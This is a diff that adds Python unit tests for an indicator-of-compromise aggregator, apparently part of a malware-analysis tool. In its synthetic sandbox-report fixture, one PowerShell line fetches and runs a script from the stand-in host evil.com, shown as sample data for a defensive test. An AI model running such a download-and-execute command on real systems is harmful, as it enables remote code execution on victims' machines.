@@ -229,6 +229,10 @@ def test_section_headings_in_output():
     # Mock response with all expected sections
     mock_response = """Brief introduction about IOCs found.
 
+## File Names
+- malware.exe
+- payload.dll
+
 ## Processes
 - process1.exe
 - process2.exe
@@ -271,6 +275,7 @@ def test_section_headings_in_output():
     
     # Verify all expected sections are present
     expected_sections = [
+        "## File Names",
         "## Processes",
         "## Network IPs",
         "## Network Domains",
@@ -289,6 +294,156 @@ def test_section_headings_in_output():
     print("✓ test_section_headings_in_output - All sections present")
 
 
+def test_aggregator_extended_iocs():
+    """Test that aggregator extracts extended IOC categories."""
+    from core.aggregator import Aggregator
+    logger = logging.getLogger("test")
+    aggregator = Aggregator(logger)
+    
+    # Create synthetic VT data with various IOC types
+    vt_data = {
+        "file_report": {
+            "ok": True,
+            "data": {
+                "data": {
+                    "attributes": {
+                        "last_analysis_stats": {"malicious": 5, "suspicious": 2},
+                        "size": 12345,
+                        "md5": "abc123",
+                        "sha256": "def456",
+                        "type_description": "Win32 EXE",
+                        "names": ["malware.exe", "evil.exe"]
+                    }
+                }
+            }
+        },
+        "behaviour": {
+            "ok": True,
+            "data": {
+                "processes": [
+                    {"name": "cmd.exe", "command_line": "cmd.exe /c C:\\Windows\\Temp\\payload.exe"},
+                    {"name": "powershell.exe", "command_line": "powershell.exe -nop -w hidden -c IEX(http://evil.com/script.ps1)"}
+                ],
+                "mutexes_created": ["Global\\TestMutex", "Local\\AnotherMutex"],
+                "registry_keys_opened": ["HKEY_LOCAL_MACHINE\\Software\\Test"],
+                "registry_keys_set": [
+                    {"key": "HKLM\\Software\\Evil\\Config", "value": "malicious"}
+                ],
+                "network": {
+                    "hosts": [
+                        {"ip": "192.168.1.100", "domain": "evil.com"},
+                        {"ip": "10.0.0.5"}
+                    ]
+                }
+            }
+        },
+        "behaviours": {
+            "ok": True,
+            "data": {
+                "crowdsourced_sigma_results": [
+                    {
+                        "rule_name": "TestSigmaRule",
+                        "match_context": [
+                            {
+                                "values": {
+                                    "Image": "C:\\Windows\\System32\\cmd.exe",
+                                    "CommandLine": "cmd.exe /c reg add HKCU\\Software\\Test",
+                                    "ParentImage": "C:\\Users\\User\\malware.exe"
+                                }
+                            }
+                        ]
+                    }
+                ]
+            }
+        }
+    }
+    
+    result = aggregator.build_struct(vt_data)
+    
+    # Verify new categories are present
+    assert "file_names" in result, "file_names key missing"
+    assert "file_paths" in result, "file_paths key missing"
+    assert "registry_keys" in result, "registry_keys key missing"
+    assert "mutexes" in result, "mutexes key missing"
+    assert "urls" in result, "urls key missing"
+    assert "ip_addresses" in result, "ip_addresses key missing"
+    assert "domains" in result, "domains key missing"
+    
+    # Verify content
+    assert len(result["file_names"]) > 0, "No file names extracted"
+    assert "malware.exe" in result["file_names"] or "evil.exe" in result["file_names"]
+    
+    assert len(result["file_paths"]) > 0, "No file paths extracted"
+    assert any("C:\\Windows" in path or "C:\\Users" in path for path in result["file_paths"])
+    
+    assert len(result["registry_keys"]) > 0, "No registry keys extracted"
+    
+    assert len(result["mutexes"]) == 2, f"Expected 2 mutexes, got {len(result['mutexes'])}"
+    assert "Global\\TestMutex" in result["mutexes"]
+    
+    assert len(result["ip_addresses"]) > 0, "No IPs extracted"
+    assert "192.168.1.100" in result["ip_addresses"] or "10.0.0.5" in result["ip_addresses"]
+    
+    assert len(result["domains"]) > 0, "No domains extracted"
+    assert "evil.com" in result["domains"]
+    
+    # URLs might be extracted from command line
+    # This is optional as extraction depends on patterns
+    
+    print(f"✓ test_aggregator_extended_iocs - Extracted:")
+    print(f"  - {len(result['file_names'])} file names")
+    print(f"  - {len(result['file_paths'])} file paths")
+    print(f"  - {len(result['registry_keys'])} registry keys")
+    print(f"  - {len(result['mutexes'])} mutexes")
+    print(f"  - {len(result['ip_addresses'])} IPs")
+    print(f"  - {len(result['domains'])} domains")
+    print(f"  - {len(result['urls'])} URLs")
+
+
+def test_aggregator_truncation_cap():
+    """Test that aggregator caps IOC categories at specified limit."""
+    from core.aggregator import Aggregator
+    logger = logging.getLogger("test")
+    aggregator = Aggregator(logger)
+    
+    # Create data with > 40 file paths
+    many_paths = [f"C:\\Path\\To\\File{i}.exe" for i in range(100)]
+    many_reg_keys = [f"HKLM\\Software\\Key{i}" for i in range(100)]
+    
+    vt_data = {
+        "file_report": {
+            "ok": True,
+            "data": {
+                "data": {
+                    "attributes": {
+                        "last_analysis_stats": {"malicious": 1},
+                        "names": ["test.exe"]
+                    }
+                }
+            }
+        },
+        "behaviour": {
+            "ok": True,
+            "data": {
+                "registry_keys_opened": many_reg_keys,
+                "processes_created": many_paths
+            }
+        }
+    }
+    
+    result = aggregator.build_struct(vt_data)
+    
+    # Verify capping (CAP = 40)
+    assert len(result["file_paths"]) <= 40, f"file_paths not capped: {len(result['file_paths'])}"
+    assert len(result["registry_keys"]) <= 40, f"registry_keys not capped: {len(result['registry_keys'])}"
+    assert len(result["file_names"]) <= 40, f"file_names not capped: {len(result['file_names'])}"
+    
+    print(f"✓ test_aggregator_truncation_cap - Categories properly capped:")
+    print(f"  - file_paths: {len(result['file_paths'])} (max 40)")
+    print(f"  - registry_keys: {len(result['registry_keys'])} (max 40)")
+    print(f"  - file_names: {len(result['file_names'])} (max 40)")
+
+
 if __name__ == "__main__":
     test_raw_mode_success()
     test_raw_mode_default()
@@ -297,5 +452,9 @@ if __name__ == "__main__":
     test_raw_mode_truncates_long_context()
     test_raw_mode_llm_failure()
     test_section_headings_in_output()
+    test_aggregator_extended_iocs()
+    test_aggregator_truncation_cap()
     
     print("\nAll IOC raw mode tests passed! ✅")
+
+
